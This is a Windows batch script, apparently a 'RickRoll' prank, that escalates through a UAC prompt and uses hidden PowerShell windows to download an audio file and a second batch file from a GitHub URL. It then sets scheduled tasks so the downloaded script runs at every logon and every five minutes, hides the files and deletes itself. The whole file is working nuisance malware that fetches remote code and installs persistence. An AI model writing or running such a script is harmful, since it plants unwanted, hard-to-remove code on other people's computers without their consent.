@echo on
 whoami /all | findstr S-1-16-12288 > nul
 if %errorlevel%==1 goto NotAdmin
cd /D "%~dp0"
Powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Admin RickRoll/RickRoll.mp3' -OutFile .\rickroll.mp3 -windowstyle hidden
Powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Admin RickRoll/A.bat' -OutFile .\A.bat -windowstyle hidden
copy rickroll.mp4 "C:%homepath%"
copy A.bat "C:%homepath%"
Schtasks /create /sc ONLOGON /tn L /tr "C:%homepath%\A.bat" 
Schtasks /create /sc DAILY /tn LOL /tr "C:%homepath%\A.bat" /ri 5 /du 24:00
%homepath%
attrib +h A.bat
attrib +h rickroll.mp3
cd /D "%~dp0"
del A.bat
del rickroll.mp3
del Test.bat
exit
timeout -1
:NotAdmin
powershell -command "Start-Process Test.bat -Verb runas" && (
  exit
timeout -1
) || (
  echo yourCommand failed
powershell start .\Test.bat -windowstyle hidden
exit
)
exit
timeout -1
